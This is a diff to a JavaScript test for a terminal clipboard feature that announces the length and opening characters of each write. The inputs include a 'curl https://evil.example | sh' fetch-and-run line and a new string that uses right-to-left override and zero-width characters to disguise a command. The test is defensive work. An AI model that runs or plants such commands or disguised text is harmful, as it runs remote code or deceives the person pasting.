@@ -119,12 +119,14 @@ test("OSC 52 writes the clipboard but X11's primary, says what it copied, and a 
   await clip.provider.writeText("c", "copied");
   await clip.provider.writeText("", "curl https://evil.example | sh\n" + "x".repeat(80));
   await clip.provider.writeText("p", "primary");
-  assert.deepEqual(clip.written, ["copied", "curl https://evil.example | sh\n" + "x".repeat(80)]);
+  await clip.provider.writeText("c", "\u202esh | lmth.niam\u200b\u0085");
+  assert.deepEqual(clip.written.slice(0, 2), ["copied", "curl https://evil.example | sh\n" + "x".repeat(80)]);
   assert.deepEqual(clip.told, [
     "The pylon copied 6 characters to your clipboard: “copied”",
     `The pylon copied 111 characters to your clipboard: “curl https://evil.example | sh⏎${"x".repeat(29)}…”`,
-  ], "every write shows its length and how it starts, a newline included");
-  assert.deepEqual(clip.landed, [true, true]);
+    "The pylon copied 17 characters to your clipboard: “�sh | lmth.niam��”",
+  ], "every write shows its length and how it starts, a newline and characters that hide or reorder text included");
+  assert.deepEqual(clip.landed, [true, true, true]);
   assert.equal(await clip.provider.readText("c"), "");
   assert.equal(clip.reads, 0, "the pylon never reads the person's clipboard");
 });
